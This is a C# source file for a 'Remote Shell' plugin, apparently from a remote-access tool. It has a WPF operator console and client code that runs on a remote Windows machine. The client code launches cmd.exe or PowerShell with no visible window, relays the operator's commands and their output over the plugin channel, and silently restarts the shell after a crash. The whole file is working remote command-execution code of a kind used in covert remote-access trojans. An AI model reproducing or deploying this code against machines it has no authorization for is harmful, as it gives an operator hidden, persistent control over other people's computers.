#nullable disable

using System;
using System.Collections.Concurrent;
using System.Runtime.Versioning;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;

namespace WpfApp.Plugins.Builtin
{
    [SupportedOSPlatform("windows")]
    public class ShellPlugin : IServerPlugin
    {
        private PluginHost _host;
        private readonly ConcurrentDictionary<string, ShellPluginUI> _clientUIs = new();

        public string PluginId => "shell";
        public string DisplayName => "Remote Shell";
        public string Version => "1.0.0";
        public string Description => "Interactive cmd.exe / powershell.exe remote shell.";

        public Task Initialize(PluginHost host)
        {
            _host = host;
            return Task.CompletedTask;
        }

        public Task Shutdown()
        {
            foreach (var ui in _clientUIs.Values)
                ui.Dispose();
            _clientUIs.Clear();
            return Task.CompletedTask;
        }

        public string GetClientCode()
        {
            return @"
using System;
using System.Collections.Concurrent;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace ClientPlugin_shell
{
    public class Main
    {
        private Process _process;
        private Func<byte[], Task> _send;
        private CancellationTokenSource _cts = new CancellationTokenSource();
        private Encoding _encoding;
        private StreamWriter _inputWriter;
        private readonly ConcurrentQueue<string> _outputQueue = new ConcurrentQueue<string>();
        private readonly AutoResetEvent _outputSignal = new AutoResetEvent(false);
        private volatile string _processType = """";
        private int _processId;

        public async Task Run(Func<byte[], Task> sendData, Func<Task<byte[]>> receiveData)
        {
            _send = sendData;
            var cultureInfo = CultureInfo.InstalledUICulture;
            try { _encoding = Encoding.GetEncoding(cultureInfo.TextInfo.OEMCodePage); }
            catch { _encoding = Encoding.UTF8; }

            Task.Run((Func<Task>)(ProcessOutputLoop));

            await _send(new byte[] { 0xFE });

            try
            {
                while (!_cts.IsCancellationRequested)
                {
                    byte[] data = await receiveData();
                    if (data == null || data.Length == 0) break;

                    byte cmd = data[0];
                    switch (cmd)
                    {
                        case 0x00:
                            if (_process != null && !_process.HasExited && data.Length > 1)
                            {
                                string input = Encoding.UTF8.GetString(data, 1, data.Length - 1);
                                lock (_inputWriter) { _inputWriter.WriteLine(input); _inputWriter.Flush(); }
                            }
                            break;
                        case 0x01:
                            await StartProcess(""cmd.exe"");
                            break;
                        case 0x02:
                            await StartProcess(""powershell.exe"");
                            break;
                        case 0x03:
                            KillProcessAndChildren();
                            break;
                    }
                }
            }
            finally
            {
                KillProcessAndChildren();
            }
        }

        private async Task ProcessOutputLoop()
        {
            while (!_cts.IsCancellationRequested)
            {
                try { _outputSignal.WaitOne(200); } catch { return; }
                string line;
                while (_outputQueue.TryDequeue(out line))
                {
                    string converted = ConvertEncoding(_encoding, line);
                    byte[] text = Encoding.UTF8.GetBytes(converted);
                    if (text.Length == 0) continue;
                    byte[] msg = new byte[text.Length + 1];
                    msg[0] = 0x00;
                    Buffer.BlockCopy(text, 0, msg, 1, text.Length);
                    try { await _send(msg); } catch { return; }
                }
            }
        }

        private async Task StartProcess(string fileName)
        {
            KillProcessAndChildren();
            _processType = fileName.Contains(""powershell"") ? ""powershell"" : ""cmd"";
            Exception startError = null;
            try
            {
                _process = new Process();
                _process.StartInfo.FileName = fileName;
                _process.StartInfo.RedirectStandardInput = true;
                _process.StartInfo.RedirectStandardOutput = true;
                _process.StartInfo.RedirectStandardError = true;
                _process.StartInfo.CreateNoWindow = true;
                _process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                _process.StartInfo.UseShellExecute = false;
                _process.StartInfo.WorkingDirectory =
                    Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System));
                if (_processType == ""cmd"")
                {
                    _process.StartInfo.StandardOutputEncoding = _encoding;
                    _process.StartInfo.StandardErrorEncoding = _encoding;
                    _process.StartInfo.Arguments = ""/K CHCP "" + _encoding.CodePage;
                }
                else
                {
                    _encoding = Encoding.UTF8;
                }
                _process.EnableRaisingEvents = true;
                _process.Exited += OnProcessExited;

                _process.Start();
                _processId = _process.Id;

                _inputWriter = new StreamWriter(_process.StandardInput.BaseStream, _encoding) { AutoFlush = true };

                Thread stdoutThread = new Thread(() => ReadStream(_process.StandardOutput)) { IsBackground = true };
                Thread stderrThread = new Thread(() => ReadStream(_process.StandardError)) { IsBackground = true };
                stdoutThread.Start();
                stderrThread.Start();

                await _send(new byte[] { 0x01 });
            }
            catch (Exception ex)
            {
                startError = ex;
            }

            if (startError != null)
            {
                byte[] errText = Encoding.UTF8.GetBytes(startError.Message);
                byte[] msg = new byte[errText.Length + 1];
                msg[0] = 0x03;
                Buffer.BlockCopy(errText, 0, msg, 1, errText.Length);
                try { await _send(msg); } catch { }
            }
        }

        private void ReadStream(StreamReader reader)
        {
            try
            {
                int ch;
                var sb = new StringBuilder();
                while (_process != null && !_process.HasExited && (ch = reader.Read()) > -1)
                {
                    sb.Append((char)ch);
                    if (ch == '\n' || sb.Length >= 4096)
                    {
                        _outputQueue.Enqueue(sb.ToString());
                        sb.Clear();
                        _outputSignal.Set();
                    }
                }
                if (sb.Length > 0)
                {
                    _outputQueue.Enqueue(sb.ToString());
                    _outputSignal.Set();
                }
            }
            catch { }
        }

        private void OnProcessExited(object sender, EventArgs e)
        {
            try
            {
                _outputSignal.Set();
                if (_process != null && _process.ExitCode != 0 && !_cts.IsCancellationRequested)
                {
                    _send(new byte[] { 0x04 }).Wait();
                    string savedType = _processType;
                    _process = null;
                    if (!string.IsNullOrEmpty(savedType))
                    {
                        string fileName = savedType == ""powershell"" ? ""powershell.exe"" : ""cmd.exe"";
                        Task.Run((Func<Task>)(async () => await StartProcess(fileName)));
                    }
                }
                else
                {
                    _send(new byte[] { 0x02 }).Wait();
                }
            }
            catch { }
        }

        private string ConvertEncoding(Encoding sourceEncoding, string input)
        {
            if (sourceEncoding == null || sourceEncoding == Encoding.UTF8 || string.IsNullOrEmpty(input))
                return input;
            try
            {
                byte[] srcBytes = sourceEncoding.GetBytes(input);
                byte[] utf8Bytes = Encoding.Convert(sourceEncoding, Encoding.UTF8, srcBytes);
                return Encoding.UTF8.GetString(utf8Bytes);
            }
            catch { return input; }
        }

        private void KillProcessAndChildren()
        {
            try
            {
                if (_process != null && !_process.HasExited)
                {
                    int pid = _processId;
                    try
                    {
                        Process taskkillProc = Process.Start(new ProcessStartInfo(""taskkill"", ""/T /F /PID "" + pid)
                        {
                            CreateNoWindow = true,
                            UseShellExecute = false
                        });
                        if (taskkillProc != null) taskkillProc.WaitForExit(3000);
                    }
                    catch { }
                    try { _process.Kill(); } catch { }
                }
            }
            catch { }
            finally
            {
                if (_inputWriter != null) { try { _inputWriter.Close(); } catch { } _inputWriter = null; }
                if (_process != null) { try { _process.Dispose(); } catch { } _process = null; }
                _processType = """";
            }
        }
    }
}
";
        }

        public UserControl CreateUI(PluginContext context)
        {
            var ui = new ShellPluginUI(context);
            _clientUIs[context.ClientId] = ui;
            return ui;
        }

        public Task OnClientDataReceived(string clientId, byte[] data)
        {
            if (data == null || data.Length == 0) return Task.CompletedTask;

            if (_clientUIs.TryGetValue(clientId, out var ui))
            {
                byte messageType = data[0];

                switch (messageType)
                {
                    case 0xFE:
                        ui.OnClientReady();
                        break;
                    case 0x00:
                        if (data.Length > 1)
                        {
                            string text = Encoding.UTF8.GetString(data, 1, data.Length - 1);
                            ui.AppendOutput(text);
                        }
                        break;
                    case 0x01:
                        ui.AppendOutput("[Process started]\n");
                        ui.SetProcessRunning(true);
                        break;
                    case 0x02:
                        ui.AppendOutput("[Process exited]\n");
                        ui.SetProcessRunning(false);
                        break;
                    case 0x03:
                        if (data.Length > 1)
                        {
                            string error = Encoding.UTF8.GetString(data, 1, data.Length - 1);
                            ui.AppendOutput($"[ERROR] {error}\n", (Color)Application.Current.Resources["DangerColor"]);
                        }
                        break;
                    case 0x04:
                        ui.AppendOutput("[Session closed unexpectedly — restarting...]\n",
                            (Color)Application.Current.Resources["WarningColor"]);
                        break;
                    case 0x05:
                        if (data.Length > 1)
                        {
                            string errText = Encoding.UTF8.GetString(data, 1, data.Length - 1);
                            ui.AppendOutput(errText, (Color)Application.Current.Resources["DangerColor"]);
                        }
                        break;
                }
            }

            return Task.CompletedTask;
        }

        public Task OnClientDisconnected(string clientId)
        {
            if (_clientUIs.TryRemove(clientId, out var ui))
            {
                ui.AppendOutput("\n[Client disconnected]\n");
                ui.SetProcessRunning(false);
                ui.Dispose();
            }
            return Task.CompletedTask;
        }

        public void Dispose()
        {
            foreach (var ui in _clientUIs.Values)
                ui.Dispose();
            _clientUIs.Clear();
        }
    }

    [SupportedOSPlatform("windows")]
    public class ShellPluginUI : UserControl, IDisposable
    {
        private static Color C(string key) => (Color)Application.Current.Resources[key];
        private static SolidColorBrush B(string key) => (SolidColorBrush)Application.Current.Resources[key];

        private Color BackgroundColorVal => C("BackgroundColor");
        private Color SurfaceColorVal => C("SurfaceColor");
        private Color SurfaceLightColorVal => C("SurfaceLightColor");
        private Color BorderColorVal => C("BorderColor");
        private Color TextPrimaryColorVal => C("TextPrimaryColor");
        private Color TextSecondaryColorVal => C("TextSecondaryColor");
        private Color PrimaryColorVal => C("PrimaryColor");
        private Color PrimaryHoverColorVal => C("PrimaryHoverColor");
        private Color DangerColorVal => C("DangerColor");
        private Color DangerHoverColorVal => C("DangerHoverColor");
        private Color SuccessColorVal => C("SuccessColor");
        private Color WarningColorVal => C("WarningColor");
        private Color ButtonBorderClr => C("ButtonBorderColor");
        private Color DisabledBgColorVal => C("ButtonBgColor");
        private Color DisabledFgColorVal => C("TextSecondaryColor");

        private SolidColorBrush BackgroundBrush => B("BackgroundBrush");
        private SolidColorBrush SurfaceBrush => B("SurfaceBrush");
        private SolidColorBrush SurfaceLightBrush => B("SurfaceLightBrush");
        private SolidColorBrush BorderBrushColor => B("BorderBrush");
        private SolidColorBrush TextPrimaryBrush => B("TextPrimaryBrush");
        private SolidColorBrush TextSecondaryBrush => B("TextSecondaryBrush");
        private SolidColorBrush DisabledBgBrush => B("ButtonBgBrush");
        private SolidColorBrush DisabledFgBrush => B("TextSecondaryBrush");

        private readonly PluginContext _context;
        private readonly RichTextBox _outputBox;
        private readonly TextBox _inputBox;
        private readonly Button _cmdButton;
        private readonly Button _psButton;
        private readonly Button _stopButton;
        private readonly Button _sendButton;
        private readonly FlowDocument _document;
        private readonly TextBlock _statusLabel;
        private bool _processRunning;
        private bool _clientReady;
        private string _shellType = "";

        public ShellPluginUI(PluginContext context)
        {
            _context = context;

            var grid = new Grid();
            grid.RowDefinitions.Add(new RowDefinition { Height = new GridLength(1, GridUnitType.Auto) });
            grid.RowDefinitions.Add(new RowDefinition { Height = new GridLength(1, GridUnitType.Star) });
            grid.RowDefinitions.Add(new RowDefinition { Height = new GridLength(1, GridUnitType.Auto) });

            // Toolbar
            var toolbar = new Border
            {
                Background = SurfaceBrush,
                BorderBrush = BorderBrushColor,
                BorderThickness = new Thickness(0, 0, 0, 1),
                Padding = new Thickness(8, 6, 8, 6)
            };

            var toolbarPanel = new StackPanel
            {
                Orientation = Orientation.Horizontal
            };

            _cmdButton = CreateThemedButton("CMD", SurfaceLightColorVal, C("ButtonBgHoverColor"));
            _cmdButton.Click += CmdButton_Click;

            _psButton = CreateThemedButton("PowerShell", SurfaceLightColorVal, C("ButtonBgHoverColor"));
            _psButton.Click += PsButton_Click;

            _stopButton = CreateThemedButton("Stop", DangerColorVal, DangerHoverColorVal);
            _stopButton.IsEnabled = false;
            _stopButton.Click += StopButton_Click;

            _statusLabel = new TextBlock
            {
                Text = $"Shell — {TruncateId(context.ClientId)} — Waiting for client...",
                Foreground = TextSecondaryBrush,
                VerticalAlignment = VerticalAlignment.Center,
                Margin = new Thickness(16, 0, 0, 0),
                FontSize = 12
            };

            toolbarPanel.Children.Add(_cmdButton);
            toolbarPanel.Children.Add(_psButton);
            toolbarPanel.Children.Add(_stopButton);
            toolbarPanel.Children.Add(_statusLabel);
            toolbar.Child = toolbarPanel;
            Grid.SetRow(toolbar, 0);
            grid.Children.Add(toolbar);

            // Output area
            _document = new FlowDocument
            {
                Background = BackgroundBrush,
                Foreground = new SolidColorBrush(TextPrimaryColorVal),
                FontFamily = new FontFamily("Cascadia Mono, Consolas, 'Courier New', monospace"),
                FontSize = 13,
                PagePadding = new Thickness(12)
            };

            _outputBox = new RichTextBox
            {
                Document = _document,
                IsReadOnly = true,
                Background = BackgroundBrush,
                Foreground = new SolidColorBrush(TextPrimaryColorVal),
                FontFamily = new FontFamily("Cascadia Mono, Consolas, 'Courier New', monospace"),
                FontSize = 13,
                BorderThickness = new Thickness(0),
                VerticalScrollBarVisibility = ScrollBarVisibility.Auto,
                HorizontalScrollBarVisibility = ScrollBarVisibility.Disabled,
                Padding = new Thickness(0)
            };
            Grid.SetRow(_outputBox, 1);
            grid.Children.Add(_outputBox);

            // Input area
            var inputBorder = new Border
            {
                Background = SurfaceBrush,
                BorderBrush = BorderBrushColor,
                BorderThickness = new Thickness(0, 1, 0, 0),
                Padding = new Thickness(8, 6, 8, 6)
            };

            var inputPanel = new DockPanel();

            _sendButton = CreateThemedButton("Send", PrimaryColorVal, PrimaryHoverColorVal);
            _sendButton.IsEnabled = false;
            _sendButton.Click += SendButton_Click;
            _sendButton.Margin = new Thickness(6, 0, 0, 0);
            DockPanel.SetDock(_sendButton, Dock.Right);

            _inputBox = new TextBox
            {
                Background = BackgroundBrush,
                Foreground = TextPrimaryBrush,
                FontFamily = new FontFamily("Cascadia Mono, Consolas, 'Courier New', monospace"),
                FontSize = 13,
                BorderThickness = new Thickness(1),
                BorderBrush = BorderBrushColor,
                Padding = new Thickness(8, 5, 8, 5),
                CaretBrush = TextPrimaryBrush,
                IsEnabled = false,
                VerticalContentAlignment = VerticalAlignment.Center,
                Style = null
            };
            _inputBox.KeyDown += InputBox_KeyDown;

            inputPanel.Children.Add(_sendButton);
            inputPanel.Children.Add(_inputBox);
            inputBorder.Child = inputPanel;
            Grid.SetRow(inputBorder, 2);
            grid.Children.Add(inputBorder);

            this.Content = grid;
            this.Background = BackgroundBrush;
        }

        /// <summary>
        /// Creates a button with a full ControlTemplate that properly handles
        /// normal, hover, pressed, and disabled states with dark theme colors.
        /// </summary>
        private Button CreateThemedButton(string text, Color normalBg, Color hoverBg)
        {
            var nb = new SolidColorBrush(normalBg); var hb = new SolidColorBrush(hoverBg);
            var bb = new SolidColorBrush(ButtonBorderClr); var db = new SolidColorBrush(DisabledBgColorVal);
            var tp = new ControlTemplate(typeof(Button));
            var bd = new FrameworkElementFactory(typeof(Border), "bd");
            bd.SetValue(Border.BackgroundProperty, nb); bd.SetValue(Border.BorderBrushProperty, bb);
            bd.SetValue(Border.BorderThicknessProperty, new Thickness(1));
            bd.SetValue(Border.CornerRadiusProperty, new CornerRadius(3));
            bd.SetValue(Border.PaddingProperty, new Thickness(8, 4, 8, 4));
            bd.SetValue(Border.SnapsToDevicePixelsProperty, true);
            var cp = new FrameworkElementFactory(typeof(ContentPresenter), "cp");
            cp.SetValue(ContentPresenter.HorizontalAlignmentProperty, HorizontalAlignment.Center);
            cp.SetValue(ContentPresenter.VerticalAlignmentProperty, VerticalAlignment.Center);
            bd.AppendChild(cp); tp.VisualTree = bd;
            var h = new Trigger { Property = UIElement.IsMouseOverProperty, Value = true }; h.Setters.Add(new Setter(Border.BackgroundProperty, hb, "bd")); tp.Triggers.Add(h);
            var p = new Trigger { Property = System.Windows.Controls.Primitives.ButtonBase.IsPressedProperty, Value = true }; p.Setters.Add(new Setter(Border.BackgroundProperty, hb, "bd")); p.Setters.Add(new Setter(UIElement.OpacityProperty, 0.85, "bd")); tp.Triggers.Add(p);
            var d = new Trigger { Property = UIElement.IsEnabledProperty, Value = false }; d.Setters.Add(new Setter(Border.BackgroundProperty, db, "bd")); d.Setters.Add(new Setter(ContentPresenter.OpacityProperty, 0.4, "cp")); tp.Triggers.Add(d);
            return new Button { Content = text, Template = tp, Foreground = new SolidColorBrush(TextPrimaryColorVal), Cursor = Cursors.Hand, Margin = new Thickness(2), FontSize = 12, FontWeight = FontWeights.SemiBold };
        }

        private static string TruncateId(string id)
        {
            if (string.IsNullOrEmpty(id)) return "";
            return id.Length <= 16 ? id : id.Substring(0, 16) + "…";
        }

        public void OnClientReady()
        {
            Dispatcher.BeginInvoke(() =>
            {
                _clientReady = true;
                _cmdButton.IsEnabled = true;
                _psButton.IsEnabled = true;
                _statusLabel.Text = $"Shell — {TruncateId(_context.ClientId)} — Ready";
                _statusLabel.Foreground = new SolidColorBrush(SuccessColorVal);
                AppendOutput("[Client plugin ready. Click 'CMD' or 'PowerShell' to begin.]\n",
                    SuccessColorVal);
            });
        }

        private async void CmdButton_Click(object sender, RoutedEventArgs e)
        {
            if (!_clientReady) return;
            _shellType = "CMD";
            await _context.SendToClient(new byte[] { 0x01 });
            AppendOutput("[Starting cmd.exe...]\n", TextSecondaryColorVal);
            await _context.SendToClient(new byte[] { 0x01 });
        }

        private async void PsButton_Click(object sender, RoutedEventArgs e)
        {
            if (!_clientReady) return;
            _shellType = "PS";
            await _context.SendToClient(new byte[] { 0x02 });
            AppendOutput("[Starting powershell.exe...]\n", TextSecondaryColorVal);
        }

        private async void StopButton_Click(object sender, RoutedEventArgs e)
        {
            await _context.SendToClient(new byte[] { 0x03 });
            AppendOutput("[Stopping process...]\n", TextSecondaryColorVal);
        }

        private async void SendButton_Click(object sender, RoutedEventArgs e)
        {
            await SendInput();
        }

        private async void InputBox_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Key == Key.Enter)
            {
                await SendInput();
                e.Handled = true;
            }
        }

        private async Task SendInput()
        {
            if (!_processRunning || !_clientReady) return;

            string text = _inputBox.Text;
            if (string.IsNullOrEmpty(text)) return;

            string trimmed = text.Trim().ToLowerInvariant();

            if (trimmed == "cls")
            {
                _outputBox.Document.Blocks.Clear();
                var p = new Paragraph { Margin = new Thickness(0) };
                _outputBox.Document.Blocks.Add(p);
                _inputBox.Clear();
                _inputBox.Focus();
                return;
            }

            if (trimmed == "exit" || trimmed == "exit()")
            {
                await _context.SendToClient(new byte[] { 0x03 });
                AppendOutput("> exit\n", PrimaryColorVal);
                _inputBox.Clear();
                _inputBox.Focus();
                AppendOutput("[Shell session terminated]\n", TextSecondaryColorVal);
                SetProcessRunning(false);
                return;
            }

            byte[] textBytes = Encoding.UTF8.GetBytes(text);
            byte[] msg = new byte[textBytes.Length + 1];
            msg[0] = 0x00;
            Buffer.BlockCopy(textBytes, 0, msg, 1, textBytes.Length);

            await _context.SendToClient(msg);

            AppendOutput($"> {text}\n", PrimaryColorVal);
            _inputBox.Clear();
            _inputBox.Focus();
        }

        public void AppendOutput(string text, Color? color = null)
        {
            Dispatcher.BeginInvoke(() =>
            {
                var paragraph = _document.Blocks.LastBlock as Paragraph;
                if (paragraph == null)
                {
                    paragraph = new Paragraph { Margin = new Thickness(0) };
                    _document.Blocks.Add(paragraph);
                }

                var run = new Run(text);
                if (color.HasValue)
                {
                    run.Foreground = new SolidColorBrush(color.Value);
                }

                paragraph.Inlines.Add(run);
                _outputBox.ScrollToEnd();

                // Cap output to prevent memory growth
                while (_document.Blocks.Count > 500)
                {
                    _document.Blocks.Remove(_document.Blocks.FirstBlock);
                }
            });
        }

        public void SetProcessRunning(bool running)
        {
            Dispatcher.BeginInvoke(() =>
            {
                _processRunning = running;
                _stopButton.IsEnabled = running;
                _sendButton.IsEnabled = running;
                _inputBox.IsEnabled = running;

                if (_clientReady)
                {
                    _cmdButton.IsEnabled = !running;
                    _psButton.IsEnabled = !running;
                }

                if (running)
                {
                    string type = string.IsNullOrEmpty(_shellType) ? "" : $" {_shellType}";
                    _statusLabel.Text = $"Shell — {TruncateId(_context.ClientId)}{type} — Running";
                _statusLabel.Foreground = new SolidColorBrush(SuccessColorVal);
                    _inputBox.Focus();
                }
                else
                {
                    _shellType = "";
                    _statusLabel.Text = $"Shell — {TruncateId(_context.ClientId)} — {(_clientReady ? "Ready" : "Waiting...")}";
                    _statusLabel.Foreground = _clientReady
                        ? new SolidColorBrush(TextSecondaryColorVal)
                        : new SolidColorBrush(DisabledFgColorVal);
                }
            });
        }

        public void Dispose()
        {
        }
    }
}